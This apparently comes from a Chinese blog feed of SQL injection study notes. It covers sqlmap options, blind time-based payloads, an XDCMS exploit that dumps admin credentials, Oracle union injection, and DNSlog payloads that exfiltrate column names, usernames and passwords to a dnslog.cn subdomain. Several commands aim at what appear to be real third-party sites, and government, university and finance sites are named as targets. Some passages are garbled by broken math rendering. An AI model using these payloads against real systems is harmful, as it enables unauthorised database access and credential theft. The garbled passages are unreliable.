python sqlmap.py -u &quot;http://www.cracer.com/vuln.php&quot; --data=&quot;query=foobar;d=1&quot; --param-del=&quot;;&quot;</p>
<p>cookile<br>
适用于cookie注入</p>
<p>将参加加入cookie注入测试<br>
sqlmap -u &quot;http://www.ntjx.org/jsj/DownloadShow.asp&quot; --cookie &quot;id=9&quot; --table --level 2</p>
<p>--referer<br>
sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。</p>
<p>--headers<br>
可以通过--headers参数来增加额外的http头<br>
--hearders “client-ip: 1.1.1.1'”</p>
<p>--proxy<br>
使用--proxy代理是格式为：http://url:port。<br>
--proxy=http://127.0.0.1:1080<br>
--proxy-file c:/1.txt</p>
<p>时间控制<br>
--delay<br>
可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
<p>--timeout<br>
可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。<br>
设定重试超时<br>
--retries</p>
<p>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。<br>
设定随机改变的参数值</p>
<p>--safe-url,--safe-freq<br>
有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p>
<p>绕过这个策略有两种方式：</p>
<p>1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。<br>
2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</p>
<p>sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p</p>
<p>参数设置想要测试的参数。例如： -p &quot;id,user-anget&quot;</p>
<p>有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。</p>
<p>例如，代码中是这样调用数据库的：<br>
$query = &quot;SELECT * FROM users WHERE id=(’&quot; . <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo>[</mo><mi mathvariant="normal">’</mi><mi>i</mi><mi>d</mi><mi mathvariant="normal">’</mi><mo>]</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">’</mi><mo>)</mo><mi>L</mi><mi>I</mi><mi>M</mi><mi>I</mi><mi>T</mi><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mi mathvariant="normal">&quot;</mi><mo separator="true">;</mo><mi mathvariant="normal">这</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">你</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mo>−</mo><mo>−</mo><mi>p</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>x</mi><mi mathvariant="normal">和</mi><mo>−</mo><mo>−</mo><mi>s</mi><mi>u</mi><mi>f</mi><mi>f</mi><mi>i</mi><mi>x</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">：</mi><mi>p</mi><mi>y</mi><mi>t</mi><mi>h</mi><mi>o</mi><mi>n</mi><mi>s</mi><mi>q</mi><mi>l</mi><mi>m</mi><mi>a</mi><mi>p</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>y</mi><mo>−</mo><mi>u</mi><mi mathvariant="normal">&quot;</mi><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mn>192.168.136.131</mn><mi mathvariant="normal">/</mi><mi>s</mi><mi>q</mi><mi>l</mi><mi>m</mi><mi>a</mi><mi>p</mi><mi mathvariant="normal">/</mi><mi>m</mi><mi>y</mi><mi>s</mi><mi>q</mi><mi>l</mi><mi mathvariant="normal">/</mi><mi>g</mi><mi>e</mi><msub><mi>t</mi><mi>s</mi></msub><mi>t</mi><msub><mi>r</mi><mi>b</mi></msub><mi>r</mi><mi>a</mi><mi>c</mi><mi>k</mi><mi>e</mi><mi>t</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo>?</mo><mi>i</mi><mi>d</mi><mo>=</mo><mn>1</mn><mi mathvariant="normal">&quot;</mi><mo>−</mo><mi>p</mi><mi>i</mi><mi>d</mi><mo>−</mo><mo>−</mo><mi>p</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>x</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">’</mi><mo>)</mo><mi mathvariant="normal">&quot;</mi><mo>−</mo><mo>−</mo><mi>s</mi><mi>u</mi><mi>f</mi><mi>f</mi><mi>i</mi><mi>x</mi><mi mathvariant="normal">&quot;</mi><mi>A</mi><mi>N</mi><mi>D</mi><mo>(</mo><mi mathvariant="normal">’</mi><mi>a</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">’</mi><mo>=</mo><mi mathvariant="normal">’</mi><mi>a</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">样</mi><mi mathvariant="normal">执</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">的</mi><mi>S</mi><mi>Q</mi><mi>L</mi><mi mathvariant="normal">语</mi><mi mathvariant="normal">句</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">：</mi></mrow><annotation encoding="application/x-tex">_GET[’id’] . &quot;’) LIMIT 0, 1&quot;; 
这时你就需要--prefix和--suffix参数了：
python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;
这样执行的SQL语句变成：
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">[</span><span class="mord">’</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mord">’</span><span class="mclose">]</span><span class="mord">.</span><span class="mord">&quot;</span><span class="mord">’</span><span class="mclose">)</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">&quot;</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">你</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">−</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">和</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">−</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">：</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">p</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">u</span><span class="mord">&quot;</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">.</span><span class="mord">1</span><span class="mord">3</span><span class="mord">6</span><span class="mord">.</span><span class="mord">1</span><span class="mord">3</span><span class="mord">1</span><span class="mord">/</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">p</span><span class="mord">/</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">s</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mclose">?</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault">x</span><span class="mord">&quot;</span><span class="mord">’</span><span class="mclose">)</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault">x</span><span class="mord">&quot;</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord">’</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord">’</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">’</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord">&quot;</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">执</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">Q</span><span class="mord mathdefault">L</span><span class="mord cjk_fallback">语</span><span class="mord cjk_fallback">句</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">：</span></span></span></span>query = &quot;SELECT * FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’) LIMIT 0, 1&quot;;</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[其他注入漏洞]]></title>
        <id>https://itxz.fun/post/qi-ta-zhu-ru-lou-dong/</id>
        <link href="https://itxz.fun/post/qi-ta-zhu-ru-lou-dong/">
        </link>
        <updated>2020-09-09T11:59:57.000Z</updated>
        <content type="html"><![CDATA[<p>PART 1:  各种提交方式注入的挖掘<br>
常见的提交方式<br>
GET<br>
POST<br>
COOKIE<br>
HEAD<br>
PUT<br>
OPTION<br>
GET注入<br>
get注入比较常见<br>
例如：<br>
www.cracer.com/new.asp?id=11&amp;ssid=123&amp;bid=55<br>
And 1=1<br>
And 1=2<br>
/ -0<br>
‘    %bf’</p>
<p>POST注入<br>
post提交方式主要适用于表单的提交<br>
可能存在漏洞的位置：<br>
搜索框、登录、留言、注册<br>
挖掘的时候注入魔术引号<br>
例如：<br>
www.cracer.com/admin.php<br>
测试站点：<br>
http://testasp.vulnweb.com/login.asp?tfUPass=&amp;tfUName=<br>
测试工具<br>
pangolin  sqlmap<br>
Xdcms +burp注入</p>
<p>“<br>
XDCMS全版本存在sql注入漏洞</p>
<p>需要使用代理抓包改包工具进行完成。</p>
<p>sql exp<br>
%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23</p>
<p>POST注入利用工具</p>
<p>pangolin<br>
sqlmap<br>
sqlmap -u  http://testasp.vulnweb.com/login.asp --data &quot;tfUPass=1&amp;tfUName=1&quot;<br>
POST 手工</p>
<p>http头注入<br>
x-forwarded-for.  1.1.1.1<br>
client-ip 1.1.1.1<br>
referrer</p>
<p>安全性比较高的站点<br>
会记录你ip的网站可能存在<br>
投资理财<br>
资金盘 记录ip<br>
留言<br>
贴吧</p>
<p>用户上传<br>
xss居多</p>
<p>伪静态注入<br>
http://zcb.sxjgjt.com.cn/<br>
http://zcb.sxjgjt.com.cn/index.php/Index/Ndetails/class/news/htmls/moving/id/1131.html<br>
http://zcb.sxjgjt.com.cn/index.php/Index/Ndetails/class/news/htmls/moving/id/1131<br>
www.cracer.com/xxx_html_id+123<br>
Cracer.com/sfcxdf/sfsdfs/?445.html<br>
Aspcms<br>
phpweb</p>
<p>PART 3:  延迟注入漏洞</p>
<p>延迟注入<br>
延时注入是通过页面返回的时间来判断的<br>
不同的mysql数据库版本，延迟注入语句也不同<br>
mysql &gt;=5.0  的可以使用sleep()进行查询<br>
mysql&lt;5.0  的可以使用benchmark()进行查询<br>
benchmark用法<br>
benchmark(n,sql语句)  n为查询次数<br>
通过查询次数增多 时间变得缓慢来判断是否存在延迟<br>
select benchmark(1000,select * from admin) ;</p>
<p>延迟注入<br>
sleep()延迟注入用法<br>
sleep 可以强制产生一个固定的延迟。<br>
sleep()延迟注入核心原理<br>
and if(true,sleep(5),0); ==IF(1=1, true, false);<br>
id=1 and sleep(5)  判断下是否存在延迟注入<br>
and if(substring(user(),1,4)='root',sleep(5),1) 判断当前用户<br>
and if(MID(version(),1,1) LIKE 5, sleep(5), 1)  判断数据库版本信息是否为5<br>
可以去猜解他的数据库名称<br>
and if(ascii(substring(database(),1,4))&gt;100,sleep(5),1)<br>
and If(ascii(substr(database(),1,1))&lt;115,sleep(10),1)--+<br>
and If(length((version()))=6,sleep(10),1)--+<br>
sqlmap --time-sec=2  延迟注入<br>
手工时间盲注<br>
https://blog.csdn.net/DarkHQ/article/details/79274376</p>
<p>dnslog 注入<br>
dnslog 平台会记录域名dns查询记录，通过我们把查询的结果和dns子域名拼接，发送给dnslog平台查询，就会记录我们的语句查询结果，从而快速提升延迟注入速度。<br>
条件：<br>
root权限（要借助load_file()函数）</p>
<p>dns注入列列名<br>
列列名<br>
and if((select load_file(concat('\\',(select column_name from information_schema.columns where table_name='user' limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+<br>
and if((select load_file(concat('\\',(select column_name from information_schema.columns where table_name='user' and TABLE_SCHEMA='dbname' limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+</p>
<p>第二个列名<br>
and if((select load_file(concat('\\',(select column_name from information_schema.columns where table_name='user' limit 1,1),'.7dluss.dnslog.cn\abc'))),1,1)--+</p>
<p>dns注入列数据<br>
列数据<br>
and if((select load_file(concat('\\',(select username from user limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+</p>
<p>and if((select load_file(concat('\\',(select password from user limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+<br>
PART 4:  BASE64编码注入漏洞<br>
base64编码注入<br>
解码<br>
构造语句<br>
编码<br>
<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>d</mi><mo>=</mo><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mn>6</mn><msub><mn>4</mn><mi>d</mi></msub><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">id=base64_decode(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord">6</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mopen">(</span></span></span></span>id);</p>
<p>app注入挖掘<br>
利用抓包工具获取app发送到服务器的链接<br>
burp fiddler即可<br>
得到链接进行测试</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[oracle注入]]></title>
        <id>https://itxz.fun/post/oracle-zhu-ru/</id>
        <link href="https://itxz.fun/post/oracle-zhu-ru/">
        </link>
        <updated>2020-09-08T13:26:04.000Z</updated>
        <content type="html"><![CDATA[<p>oracle<br>
db2<br>
适用与比较大的站点</p>
<p>政府机关站点<br>
大学<br>
金融 证券<br>
旅游站点</p>
<p>jsp+oracle 存在注入</p>
<p>手工<br>
几十张表<br>
bool盲注<br>
ascii<br>
工具跑<br>
/<br>
-0<br>
and 1=1<br>
and 1=2<br>
asp/aspx/jsp+oracle</p>
<p>oracle数据库介绍<br>
Oracle数据库系统是美国ORACLE公司（甲骨文）提供的以分布式数据库为核心的一组软件产品。是目前世界上使用最为广泛的数据库管理系统。基于“客户端/服务器”模式结构，客户端应用程序与用户交互，接收用户信息，并向服务器发送请求，服务器系统负责管理数据信息和各种操作数据的活动。<br>
特点<br>
    1 支持多用户、大事务量的处理<br>
    2 数据安全性和完整性的有效控制<br>
    3 支持分布式数据处理<br>
    4 移植性强</p>
<p>判断数据库<br>
判断注入<br>
and 1=1<br>
and 1=2<br>
判断oracle数据库<br>
and exists(select * from dual)<br>
and exists(select * from user_tables)</p>
<p>判断列数<br>
order by 11   返回正常<br>
order by 12    返回错误<br>
union select null，null，null，null，null</p>
<p>获取数据类型不匹配的列<br>
http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,null,null,null,null,null,null,null,null,null,null from dual</p>
<p>获取数据类型不匹配的列<br>
在每列上逐个用数字代替 如果返回正常说明该列为数字类型，反之则为非数字类型。<br>
也可以逐个用引号引起来如：'null',null...from dual, 返回正常说明该列为字符类型，反之为非数字类型</p>
<p>获取基本信息<br>
获取数据库版本<br>
(select banner from sys.v_<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>w</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>e</mi><mi>r</mi><mi>o</mi><mi>w</mi><mi>n</mi><mi>u</mi><mi>m</mi><mo>=</mo><mn>1</mn><mo>)</mo><mi mathvariant="normal">获</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">操</mi><mi mathvariant="normal">作</mi><mi mathvariant="normal">系</mi><mi mathvariant="normal">统</mi><mi mathvariant="normal">版</mi><mi mathvariant="normal">本</mi><mo>(</mo><mi>s</mi><mi>e</mi><mi>l</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>m</mi><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>r</mi><mi>f</mi><mi>r</mi><mi>o</mi><mi>m</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">version where rownum=1)
获取操作系统版本
( select member from v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">n</span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">操</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">统</span><span class="mord cjk_fallback">版</span><span class="mord cjk_fallback">本</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span></span>logfile where rownum=1)<br>
获取连接数据库的当前用户<br>
( select SYS_CONTEXT ('USERENV','CURRENT_USER')from dual)<br>
获取数据库<br>
(select owner from all_tables where rownum=1)</p>
<p>获取数据库版本<br>
http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,(select banner from sys.v_$version where rownum=1),null,null,null,null,null,null,null,null,null from dual</p>
<p>获取操作系统版本<br>
http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,( select member from v$logfile where rownum=1),null,null,null,null,null,null,null,null,null from dual</p>
<p>获取连接数据库的当前用户<br>
http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,( select SYS_CONTEXT ('USERENV','CURRENT_USER')from dual),null,null,null,null,null,null,null,null,null from dual</p>
<p>order by  10</p>
<p>union select 1,2',ull,null,null</p>
<p>admin<br>
JSSLEDU_MANGER_SYSTEMM</p>
<p>sqlmap.py - u  &quot;url&quot; ---current -db 列数据库<br>
sqlmap.py -u &quot;url&quot; -D xxx  --tables 指定数据库列表名<br>
sqlmap.py -u &quot;url&quot; --current -</p>
<p>sqlmap<br>
默认模糊匹配</p>
<p>google语法<br>
inurl：php？id=site.jp 商品名称 转换成日语</p>
<p>mysql root 在windows 权限最高<br>
在linux只是服务用户权限<br>
postgresql postgres 具有写入根目录权限<br>
user-agent：sqlmap.org</p>
<p>--random -agent<br>
用户上传<br>
xss居多<br>
sql注入<br>
burp抓包分析请求查找</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[mysql注入]]></title>
        <id>https://itxz.fun/post/mysql-zhu-ru/</id>
        <link href="https://itxz.fun/post/mysql-zhu-ru/">
        </link>
        <updated>2020-09-06T07:51:54.000Z</updated>
        <content type="html"><![CDATA[<p>lamp<br>
lnmp<br>
linux apache  mysql php<br>
linux nginx mysql php</p>
<p>show databases; 查看系统数据库有那些<br>
use mysql； 使用mysql数据库<br>
create database xy ；创建xy数据库<br>
drop database xy 删除数据库</p>
<p>use xy ；<br>
show table admin （id，int，username char（50，password char（50））；创建一个admin表，增加三个列名 id username password<br>
select * from admin ；查询admin 表里的所有内容<br>
select * from admin where id=1 ；指定条件查找，查询adnmin表的usernae，password 两列数据</p>
<p>insert into admin （id，username，password ）values （1，‘admin’，‘admmin888‘）；<br>
插入一行数据<br>
insert into admin （id，username，password）value（1，‘admin'，’admin888），（2，‘cracer'，’admin888）同时插入两行数据<br>
insert into admin （id，username，password ）values （1，‘admin’，md5（‘admmin888）‘）；<br>
update admin set password ='123123' where id =1 将这行password 改成 123123<br>
delete from admin where id =1<br>
drop table  admin; 删除admin 表</p>
<p>常见的sql语句<br>
1、说明：创建数据库<br>
CREATE DATABASE database-name<br>
2、说明：删除数据库<br>
drop database dbname<br>
3、说明：创建新表<br>
CREATE TABLE MYTABLE (name VARCHAR(20), sex CHAR(1));<br>
4、查看数据库<br>
show databases;<br>
插入数据<br>
insert into admin(username,password) value ('admin','admin');<br>
查询数据<br>
select * from admin;<br>
更新修改数据<br>
update admin set password='adsdf' where id = 1;<br>
删除数据<br>
delete from admin where id =1 ;</p>
<p>Mysql 函数<br>
1:system_user() 系统用户名<br>
2:user()        用户名<br>
3:current_user  当前用户名<br>
4:session_user()连接数据库的用户名<br>
5:database()    数据库名<br>
6:version()     MYSQL数据库版本<br>
7:load_file()  	转成16进制或者是10进制 MYSQL读取本地文件的函数<br>
8:@@datadir     读取数据库路径<br>
9:@@basedir    MYSQL 安装路径<br>
10:@@version_compile_os   操作系统</p>
<p>相关函数<br>
mid()---从文本字段中提取字符<br>
SELECT MID(column_name,start[,length]) FROM table_name;<br>
